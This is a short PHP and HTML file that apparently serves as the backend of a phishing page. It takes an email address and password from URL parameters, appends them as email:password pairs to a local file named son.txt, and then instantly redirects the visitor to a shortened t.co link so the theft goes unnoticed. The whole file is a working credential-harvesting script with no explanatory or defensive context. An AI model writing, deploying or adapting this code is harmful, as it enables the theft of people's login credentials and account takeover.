<html>
<?
$caixa1 = $_GET["email"].":";
$caixa2 = $_GET["pw"]. "\n";

$file = fopen("son.txt", "a");
$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);

fclose($file);


?>
<meta http-equiv="refresh" content="0;url=https://t.co/9YaaPlmVvf">
<noscript>
<!---
<html>
<head>
</head>
<body>
</body>
</html>